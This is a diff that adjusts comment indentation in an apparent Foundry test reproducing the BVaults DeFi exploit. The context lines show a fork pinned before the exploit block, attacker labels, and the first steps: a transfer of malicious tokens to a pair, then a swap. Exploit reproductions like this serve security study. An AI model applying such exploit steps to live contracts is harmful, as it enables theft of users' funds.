@@ -37,7 +37,7 @@ contract Exploit_BVaults is TestHarness, TokenBalanceTracker {
 
     function setUp() external {
         cheat.createSelectFork(vm.envString("RPC_URL"), 22_629_431); // We pin one block before the exploit
-            // happened
+        // happened
 
         cheat.label(ATTACKER, "Attacker");
         cheat.label(ATTACKER_CONTRACT, "Attacker Contract");
@@ -58,7 +58,7 @@ contract Exploit_BVaults is TestHarness, TokenBalanceTracker {
         cheat.startPrank(ATTACKER);
         // 1: Sent malicious tokens to the pair
         require(maliciousToken.transfer(address(MALICIOUS_PAIR), 10_000 ether), "transfer failed"); // Sends
-            // 10.000 tokens to the pair
+        // 10.000 tokens to the pair
 
         // 2: Swap to get WBNB into a malicious contract
         emit log_string("\nBefore Swap Balances");
